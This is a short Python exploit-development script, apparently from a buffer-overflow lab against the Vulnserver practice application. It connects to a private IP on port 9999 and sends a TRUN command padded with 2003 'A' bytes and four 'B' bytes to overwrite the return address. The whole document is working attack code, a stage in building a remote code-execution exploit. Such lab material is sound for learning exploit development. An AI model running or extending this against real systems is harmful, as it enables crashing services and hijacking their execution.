import sys, socket
shellcode = "TRUN /.:/" + "A" * 2003 + "B" * 4
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Socket created!")
    s.connect(("192.168.1.150", 9999))
    print("Connected!")
    s.send(shellcode.encode("ascii"))
    print("Sent!")
    s.close()
except Exception as e:
    print(e)
    print("Error connecting to server...")
    sys.exit()
